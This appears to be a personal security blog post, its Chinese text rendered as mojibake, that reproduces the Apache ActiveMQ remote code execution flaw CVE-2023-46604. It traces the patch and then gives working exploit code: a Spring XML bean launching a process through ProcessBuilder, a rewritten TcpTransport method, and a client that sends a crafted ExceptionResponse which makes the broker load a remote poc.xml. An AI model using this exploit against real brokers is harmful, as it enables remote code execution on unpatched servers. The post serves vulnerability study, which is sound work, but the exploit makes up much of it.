---
layout: post
title: ActiveMQ (CVE-2023-46604)
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqi
---

#  ActiveMQ (CVE-2023-46604) é‚£å°±å…ˆå¤ç°ä¸€ä¸‹è¿™ä¸ªæ¼æ´

`æ¼æ´æè¿°`

```java
Apache ActiveMQä¸­å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå…·æœ‰Apache ActiveMQæœåŠ¡å™¨TCPç«¯å£ï¼ˆé»˜è®¤ä¸º61616ï¼‰è®¿é—®æƒé™çš„è¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€æ¶æ„æ•°æ®åˆ°æœåŠ¡å™¨ä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚
```

```java
å½±å“ç‰ˆæœ¬ï¼š
Apache ActiveMQ < 5.18.3
Apache ActiveMQ < 5.17.6
Apache ActiveMQ < 5.16.7
Apache ActiveMQ < 5.15.16
```

å­¦åˆ°äº†githubæ¯”å¯¹ç‰ˆæœ¬å·®å¼‚çš„ä¸€ä¸ªå°æ–¹æ³•

åœ¨github urlåœ°å€åé¢åŠ ä¸€ä¸ªï¼Œ/compareè¿›è¡Œæ¯”è¾ƒ

`baseæ˜¯ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œcompareæ˜¯ä¹‹åçš„`

![image-20240105181808805](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105181808805.png)

ä¸‹é¢æ˜¯å®ç°çš„æ•ˆæœï¼Œæ„Ÿè§‰åœ¨é€šè¿‡æ¼æ´ä¿®å¤å»å¤ç°æ¼æ´çš„æ—¶å€™è›®æœ‰ç”¨çš„

![image-20240105181902557](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105181902557.png)

è¿™é‡Œå‘ç°äº†è¿™æ ·çš„ä¸€ä¸ªæ”¹å˜ï¼Œé™åˆ¶äº†å¿…é¡»æ˜¯Throwableçš„å­ç±»

![image-20240105182753096](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105182753096.png)

ä»¥å‰ä¹Ÿè§è¿‡è¿™æ ·çš„æ¼æ´å°±æ˜¯ä¸ºäº†é˜²æ²»å®ä¾‹åŒ–ä»»æ„çš„ç±»å¯¹è±¡ï¼Œçœ‹ä¸‹é¢çš„ä»£ç ï¼Œç»¿è‰²çš„æ˜¯æ–°ç‰ˆæœ¬æ·»åŠ çš„ï¼Œå¦‚æœæ²¡æœ‰`validateIsThrowable`ä¸å°±æœ‰ä»»æ„å®ä¾‹åŒ–Stringæœ‰å‚æ„é€ æ–¹æ³•äº†å˜›ï¼Ÿ

ï¼ˆæ­£å¥½å‰å‡ ç¯‡çš„postgrasqlä¹Ÿæ˜¯è¿™æ ·å­é€ æˆçš„æ¼æ´ï¼Œè¿›ä¸€æ­¥è§¦å‘ELã€ç„¶åfileoutputæƒ…å†µæŒ‡å®šæ–‡ä»¶è¿™ç§ï¼‰

![image-20240105183016311](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105183016311.png)

æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¡®å®šï¼Œæ±¡ç‚¹å°±æ˜¯`BaseDataStreamMarshaller.java`è¿™ä¸ªç±»ï¼Œï¼ˆåˆšå›å»çœ‹äº†çœ‹postgresqlé‚£ä¸ªCVEï¼ŒçœŸçš„æ˜¯ä¸€æ¨¡ä¸€æ ·è¿æ¼æ´å‡ºå‘ç‚¹ï¼Œä¿®å¤æ–¹æ¡ˆéƒ½ä¸€æ ·ï¼‰

`org.springframework.context.support.ClassPathXmlApplicationContext`

```java
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<!--    æ™®é€šæ–¹å¼åˆ›å»ºç±»-->
   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
           
            <value>calc.exe</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

ç›´æ¥å®ä¾‹åŒ–è§¦å‘æ ¡éªŒä¸€ä¸‹ï¼ˆã€‚ã€‚ã€‚çœŸçš„ä¸ä¼šæç¯å¢ƒï¼Œæäº†1ä¸ªå°æ—¶ï¼Œæœ€åç›´æ¥å¯¼äº†ä¸ªjaråŒ…ï¼‰

å‘ç°`BaseDataStreamMarshalleræ˜¯ä¸€ä¸ªæŠ½è±¡ç±»`ï¼Œæ‰¾ä»–çš„å­ç±»ï¼Œè¿™é‡Œæ‰¾çš„æ˜¯ExceptionResponseMarshaller

![image-20240105193721382](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105193721382.png)

`createThrowable`æ˜¯ä¸€ä¸ªç§æœ‰çš„æ–¹æ³•

![image-20240105193951459](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105193951459.png)

```java
åˆ°è¿™é‡Œæˆ‘è‡ªå·±æƒ³çš„å°±æ˜¯ï¼Œé€å±‚è°ƒç”¨ï¼Œç›´åˆ°ä¸€ä¸ªæˆ‘ä»¬èƒ½æ§åˆ¶çš„é¡µé¢ï¼Œæ¯”å¦‚jspã€æˆ–è€…ååºåˆ—åŒ–ï¼Œä¼ å‚ç‚¹è¿™ç§
```

ç»§ç»­ç½‘ä¸Šæ‰¾å‘ç°ä»ç„¶ä¸æ˜¯publicæƒé™ï¼Œæ˜¯ä¸€ä¸ªåŒ…æƒé™

![image-20240105194531622](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105194531622.png)

æ¥ç€å°±æ˜¯æˆ‘ä»¬ä¸Šé¢çš„é‚£ä¸ªç±»çš„æ–¹æ³•ï¼Œ`ExceptionResponseMarshaller#tightUnmarshal`ï¼Œè¿™æ ·å°±æˆäº†publicéƒ½æ˜¯å¯ä»¥è°ƒç”¨çš„ï¼Œåˆ°è¿™é‡Œå·²ç»å¯ä»¥æ‰‹åŠ¨è§¦å‘æ¼æ´ï¼Œä½†æ˜¯è¿˜å·®ä¸€ç‚¹

![image-20240105194816638](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105194816638.png)

åˆ°è¿™é‡Œå¡ä½äº†ï¼Œè°ƒç”¨`tightUnmarshal`çš„æ–¹æ³•å®åœ¨å¤ªå¤šäº†ä¸çŸ¥é“ç”¨å“ªä¸€ä¸ªã€‚ã€‚ã€‚ï¼ˆå¦‚æœä¸€ä¸ªä¸ªå®éªŒçš„è¯æ„Ÿè§‰ä¸å¤ªå¯¹)

![image-20240105195154972](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105195154972.png)

çœ‹äº†çœ‹å¸ˆå‚…ä»¬å†™çš„æ–‡ç« å¤§ä½“çœ‹æ‡‚äº†å…ˆæ€»ç»“ä¸€ä¸‹ï¼ˆæ˜å¤©åœ¨è¯¦ç»†åˆ†æï¼‰

```java
doUnmarshal  å°±ç›¸å½“äºä¸€ä¸ªååºåˆ—åŒ–
```

![image-20240105214127875](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105214127875.png)

![image-20240105214218561](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105214218561.png)

è¿™ä¸ª dataType å…¶å®å¯¹åº”çš„å°±æ˜¯ Message ç±»å†…éƒ¨çš„ `DATA_STRUCTURE_TYPE` å­—æ®µ

ä½†æ˜¯é»˜è®¤çš„demo ä¸­æˆ‘ä»¬å‘é€çš„æ˜¯ä¸€ä¸ª ObjectMessage (ActiveMQObjectMessage) å¯¹è±¡, å®ƒçš„ dataType æ˜¯ 26

![image-20240105214340742](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105214340742.png)

æˆ‘çš„ç¬¬ä¸€æƒ³æ³•å°±æ˜¯ç›´æ¥æ”¹æˆ31ä¸å°±è¡Œäº†å˜›(è¿™é‡Œè¿˜æ²¡æ‡‚ï¼Œä¸‹é¢æ˜¯ä½¬ä»¬çš„æƒ³æ³•)

```java
æˆ‘ä¸€å¼€å§‹çš„æ€è·¯æ˜¯å»ä¿®æ”¹ ObjectMessage çš„ DATA_STRUCTURE_TYPE å­—æ®µ, æŠŠå®ƒæ”¹æˆ 31 ç„¶åå‘é€

åæ¥æƒ³äº†ä¸€ä¼šå‘ç°ä¸èƒ½è¿™ä¹ˆæ, å› ä¸ºå¯¹äºä¸åŒçš„ Message ç±»å‹, åºåˆ—åŒ–å™¨ä¼šå•ç‹¬è¿›è¡Œå¤„ç†, æ¯”å¦‚è°ƒç”¨ writeXXX å’Œ readXXX çš„ç±»å‹å’Œæ¬¡æ•°éƒ½ä¸ä¸€æ ·
```

ç„¶åç›®å…‰æ”¾åˆ°äº†ä¼ å‚è¿™é‡Œï¼ŒdataTypeæ˜¯ä»disä¸­è·å¾—çš„ï¼Œé‚£ä¹ˆæ§åˆ¶disä¸å°±å¯ä»¥æ§åˆ¶dataTypeäº†å˜›~~~

![image-20240105214725528](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105214725528.png)

å°±æ˜¯åœ¨è¿™é‡Œ

![image-20240105214852297](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105214852297.png)

![image-20240105215045552](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240105215045552.png)

ä¸Šé¢æ˜¯ååºåˆ—åŒ–æˆ‘ä»¬ç›´æ¥çœ‹åºåˆ—åŒ–çš„æµç¨‹å³å¯

çœ‹marshalçš„ä¸Šå±‚è°ƒç”¨æ–¹æ³•ï¼Œæ˜¯ `TcpTransport#oneway`

![image-20240106121736421](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240106121736421.png)

```java
è¿™é‡Œæ˜¯åŸæœ¬çš„å†…å®¹
//    public void oneway(Object command) throws IOException {
//        this.checkStarted();
//        this.wireFormat.marshal(command, this.dataOut);
//        this.dataOut.flush();
//    }
è¿™é‡Œæ˜¯é‡å†™çš„å†…å®¹
public void oneway(Object command) throws IOException {
    this.checkStarted();
    Throwable obj = new ClassPathXmlApplicationContext("http://127.0.0.1:8000/poc.xml");
    ExceptionResponse response = new ExceptionResponse(obj);
    this.wireFormat.marshal(response, this.dataOut);
    this.dataOut.flush();
}
```

å¯ä»¥å‘ç°æˆ‘ä»¬ç›´æ¥é‡å†™äº†æ–¹æ³•ï¼ŒExceptionResponseçš„å‚æ•°éœ€è¦æ˜¯Throwableç±»å‹ï¼Œ`Throwable obj = new ClassPathXmlApplicationContext`è¿™é‡Œä¹Ÿé‡å†™äº†ClassPathXmlApplicationContextè¿™ä¸ªç±»ï¼Œè®©å®ƒç»§æ‰¿å¦åˆ™ä¸èƒ½å¼ºè½¬ï¼Œèƒ½æ‰§è¡Œä¸Šé¢çš„æ“ä½œ

`å…¶å®éƒ½æ˜¯å› ä¸ºï¼Œåºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥ä¿®æ”¹å¹¶ä¸”ååºåˆ—åŒ–å¹¶ä¸ä¼šè¢«å½±å“`(jacksonå°±é‡å†™äº†æŸä¸ªç±»çš„æ–¹æ³•ä¸ç„¶ä¸èƒ½åºåˆ—åŒ–ï¼Œä½†æˆ‘è§‰å¾—ä»…ä»…æ˜¯åºåˆ—åŒ–èµ‹å€¼ï¼Œå› ä¸ºååºåˆ—åŒ–çš„ä»£ç æˆ‘ä»¬æ˜¯ä¸èƒ½æ”¹åŠ¨çš„ï¼Œåªæ˜¯æŠŠå€¼æ”¾è¿›å»äº†)

è„‘å­çš„é”™è¯¯æ€è€ƒ

```java
æ—¢ç„¶å¯ä»¥ä¿®æ”¹åºåˆ—åŒ–ï¼Œé‚£ç›´æ¥é‡å†™æ–¹æ³•ç›´æ¥å¼¹shellï¼Ÿï¼Ÿï¼Ÿ
ç¡®å®æ˜¯å¯ä»¥èµ‹å€¼ï¼Œä½†å…·ä½“çš„æ“ä½œè¿˜æ˜¯å¾—çœ‹ååºåˆ—åŒ–~~~
```

```java
package org.springframework.context.support;

public class ClassPathXmlApplicationContext extends Throwable{
    private String message;

    public ClassPathXmlApplicationContext(String message) {
        this.message = message;
    }

    @Override
    public String getMessage() {
        return message;
    }
}
```

ç„¶åæ˜¯ä»ç½‘ä¸Šæ‰¾ä¸€ä¸ªä½¿ç”¨æ¡ˆä¾‹å³å¯

```java
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.command.ActiveMQObjectMessage;
import org.apache.activemq.command.ExceptionResponse;
import org.apache.activemq.openwire.OpenWireFormat;
import org.apache.activemq.openwire.v1.BaseDataStreamMarshaller;
import org.apache.activemq.openwire.v1.ExceptionResponseMarshaller;

import javax.jms.*;


public class poc {
    public static void main(String[] args) throws JMSException {

        ConnectionFactory connectionFactory = new ActiveMQConnectionFactory("tcp://localhost:61616");
        Connection connection = connectionFactory.createConnection();
        connection.start();
        Session session = connection.createSession(true,1);
        Destination destination = session.createQueue("tempQueue");

        MessageProducer producer = session.createProducer(destination);
        Message message = session.createObjectMessage("123");
        producer.send(message);
        connection.close();
    }
}
```

åºåˆ—åŒ–é“¾å­ï¼Œè®°å¾—å¼€å¯æœåŠ¡ç«¯ï¼Œå› ä¸ºæ¼æ´å°±æ˜¯å®¢æˆ·ç«¯è¿œç¨‹å‘½ä»¤æ‰§è¡ŒæœåŠ¡ç«¯ï¼Œæ²¡æœåŠ¡ç«¯ğŸ˜‚ğŸ˜‚ğŸ˜‚

![image-20240106122752311](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240106122752311.png)

å› ä¸ºæˆ‘çš„æœåŠ¡ç«¯æ­å»ºåœ¨äº†æœ¬åœ°ï¼Œæ‰€ä»¥æœ¬åœ°å¼¹å‡ºäº†è®¡ç®—å™¨

![image-20240106123012320](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240106123012320.png)

#### poc.xml

```java
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<!--    æ™®é€šæ–¹å¼åˆ›å»ºç±»-->
   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>calc.exe</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

è¿˜æœ‰ä¸€ç§ç›´æ¥ä¼ å…¥çš„æ–¹æ³•ï¼Œåªéœ€é‡å†™`ClassPathXmlApplicationContext`å³å¯

```java
ConnectionFactory connectionFactory = new
ActiveMQConnectionFactory("tcp://localhost:61616");

Connection connection = connectionFactory.createConnection();
connection.start();
ActiveMQSession session = (ActiveMQSession) connection.createSession(false,Session.AUTO_ACKNOWLEDGE);
ExceptionResponse exceptionResponse = new ExceptionResponse();

exceptionResponse.setException(new ClassPathXmlApplicationContext("http://127.0.0.1:8000/poc.xml"));

session.syncSendPacket(exceptionResponse);

connection.close();
```

ä»syncSendPacketé€å±‚è°ƒç”¨ï¼Œæœ€ç»ˆåˆ°è¾¾requestæ–¹æ³•ä¸­ï¼Œ asyncRequestæ˜¯åºåˆ—åŒ–ï¼Œç„¶åå†getResultæœåŠ¡ç«¯åˆè¿›è¡Œååºåˆ—

![image-20240106130420242](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240106130420242.png)

æ€»ç»“ï¼š

```java
é€šè¿‡ä¿®å¤åœ°æ–¹å°±å¯ä»¥çœ‹åˆ°æ¼æ´åŸå› ï¼Œä»»æ„ç±»çš„æœ‰å‚å®ä¾‹åŒ–ï¼Œå¯¼è‡´è§¦å‘äº†æ¼æ´
org.springframework.context.support;ClassPathXmlApplicationContext  åˆå› ä¸ºé¡¹ç›®ä¸­æœ‰springbootä¾èµ–ï¼Œå¯¼è‡´è§¦å‘åŠ è½½è¿œç¨‹xml
```



# 2024.8.8

å‘ƒå‘ƒå‘ƒç°åœ¨è¿˜è®°å¾—ï¼Œå½“æ—¶æè¿™ä¸ªmqæ¼æ´çš„æ—¶å€™ï¼Œæ˜¯æœŸæœ«åœ¨å›¾ä¹¦é¦†æçš„ï¼Œæ—è¾¹å¶é‡dk1ã€2ç­çš„äºº
å½“æ—¶å¯èƒ½åœ¨å­¦å‘ƒå‘ƒå‘ƒå¿˜äº†ï¼Œåæ­£è®°å¿†å¬æ·±åˆ»çš„ï¼Œæ²¡æƒ³åˆ°åœ¨è®®é¢˜ä¸Šåˆçœ‹åˆ°äº†è¿™ä¸ªæ¼æ´çš„ä¸å‡ºç½‘åˆ©ç”¨ï¼Œè¿™æ¬¡åœ¨LAB hvvå®ä¹ ä¸­ï¼Œæ„Ÿæ…¨ä¸‡åˆ†å‘€ã€‚å—¨è€äº†



















```java
```















